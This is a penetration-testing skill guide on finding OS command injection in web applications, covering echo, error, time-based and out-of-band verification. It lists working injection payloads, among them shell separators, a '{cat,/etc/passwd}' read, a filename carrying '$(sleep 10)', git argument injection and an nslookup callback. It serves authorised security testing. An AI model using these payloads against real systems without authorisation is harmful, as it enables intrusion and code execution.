---
name: reviewing-cmd-injection
description: >-
  Detect OS Command Injection vulnerabilities including direct concatenation, shell metacharacter 
  injection, argument injection, and indirect RCE. Strategies cover echo-based, time-based, 
  and Out-of-Band (OOB) verification.
domain: cybersecurity
subdomain: web-application-security
tags: [command-injection, rce, os-command, penetration-testing]
mitre_attack: [T1059.004, T1190]
version: "1.0"
author: Victor
license: Apache-2.0
---

# Reviewing Command Injection

## When to Use

- When the application exposes network diagnostic features (ping, traceroute, nslookup).
- When the application performs file/media processing (thumbnail generation, video transcoding, PDF conversion, OCR).
- When an endpoint accepts filenames, URLs, or repository paths that might be passed to underlying OS utilities (e.g., `curl`, `git`, `ffmpeg`, `ImageMagick`).
- When JSON bodies or URL parameters contain suspicious keys like `host`, `ip`, `target`, `cmd`, or `command`.

**Do not use** destructive commands (e.g., `rm -rf`, `reboot`, `kill`) or commands that write persistent backdoors to the target environment.

## Prerequisites

- An interception proxy (Burp Suite, ZAP).
- An Out-of-Band (OOB) listener (e.g., Burp Collaborator, interactsh) to catch blind, non-echoing injections.
- Safe probe commands (`id`, `whoami`, `hostname`, `sleep 5`).

## Workflow

### Step 1: Baseline Establishment
Identify the target parameter. Send a normal request to observe the expected response size and time.

### Step 2: Metacharacter & Separator Injection
Append command separators to the parameter to see if you can break out of the intended command context and execute an arbitrary command (like `id` or `sleep`).

- **Linux Context**: `; id`, `| id`, `&& id`, `` `id` ``, `$(id)`, `%0a id`
- **Windows Context**: `& whoami`, `&& whoami`, `| whoami`
- **Space Evasion (if spaces are blocked)**: `${IFS}id`, `{cat,/etc/passwd}`

*Tip: Do not test all payloads at once. Inject one at a time to identify the exact context.*

### Step 3: Response Analysis (Observation Channels)
Determine how the injection manifests:
- **Echo-based**: The output of your injected command (e.g., `uid=1000(www-data)`) appears directly in the HTTP response.
- **Error-based**: The shell crashes and returns an error (e.g., `/bin/sh: 1: ... not found`, `is not recognized as an internal or external command`). This confirms the OS and shell type.
- **Time-based Blind**: The response is identical, but injecting `sleep 5` delays the HTTP response by exactly 5 seconds compared to `sleep 0`.
- **Out-of-Band (OOB)**: The application does not delay and does not echo, but an injected `nslookup <your-oob-domain>` results in a DNS query hitting your listener.

### Step 4: Verification
- **Echo**: Verify by executing two different, safe commands and checking the output.
- **Time-based**: Repeat the `sleep` test 3 times to ensure the delay is not just network jitter.
- **OOB**: Ensure the token used in the OOB payload is unique to this specific test to prevent false attribution.

### Verification and Validation Phase
1. Establish target environment baseline and identify endpoint parameters.
2. Execute realistic detection payload to evaluate vulnerability exposure:

```bash
curl -i -s -X POST "https://target.example.com/api/v1/diagnostics" \
     -H "Content-Type: application/json" \
     -d '{"ip": "127.0.0.1; sleep 5"}'
```

3. Analyze HTTP response status, reflected headers, and execution timing to confirm finding.

## Key Concepts

| Term | Definition |
|------|------------|
| **Command Separators** | Special characters (`;`, `\|`, `&&`) that tell the OS shell to stop the current command and begin a new one. |
| **Argument Injection** | A variation where the input is not passed to a shell, but passed as an argument to a specific executable (like `curl --upload-file`). The attacker injects argument flags instead of shell separators. |
| **Blind Command Injection** | Command injection where the application does not return the output of the executed command in the HTTP response. |

## Tools & Systems

- Burp Suite Professional / Community Edition
- Standard web browsers and interception proxies.

## Common Scenarios

### Scenario: False Positive - Application Level Delays
**Context**: You inject `sleep 10` and the application takes 10 seconds to respond. You assume time-based command injection.
**Analysis**: The delay might be caused by an application-level timeout or a heavy database query rather than OS execution.
**Action**: Verify by trying `sleep 0`. If `sleep 0` *also* takes 10 seconds, it's a network/app issue, not an injection.

### Scenario: Argument Injection (No Shell)
**Context**: The application executes `git clone <user_input>`. You inject `http://github.com/repo; id`, but it fails because the application uses safe parameter binding (no shell execution).
**Analysis**: Even without a shell, you can inject arguments specific to the `git` binary.
**Action**: Inject `--upload-pack=<payload>` or `--core.fsmonitor=<payload>` to force the `git` binary to execute arbitrary code.

### Scenario: Second-Order Injection
**Context**: You upload a file named `$(sleep 10).jpg`. The upload succeeds instantly.
**Analysis**: The injection does not trigger upon upload. It triggers when an administrative cron job or background worker attempts to process the filename later.
**Action**: Monitor OOB listeners for delayed interactions.

## Output Format

Document confirmed vulnerabilities with evidence of execution:

```json
{
  "id": "cmdi-001",
  "title": "Blind OS Command Injection via Diagnostic Endpoint",
  "severity": "critical",
  "cwe": "CWE-78",
  "parameter": "target_ip (JSON Body)",
  "status": "confirmed",
  "evidence": {
    "payload": "127.0.0.1; nslookup cmdi-test.your-collaborator.net",
    "observation_channel": "oob-dns",
    "execution_proof": "Received a DNS A-record lookup for cmdi-test.your-collaborator.net at 2026-06-23T10:00:00Z."
  },
  "description": "The target_ip parameter is concatenated directly into a shell ping command. While there is no output reflected in the HTTP response, OOB DNS interaction proves arbitrary command execution."
}
```
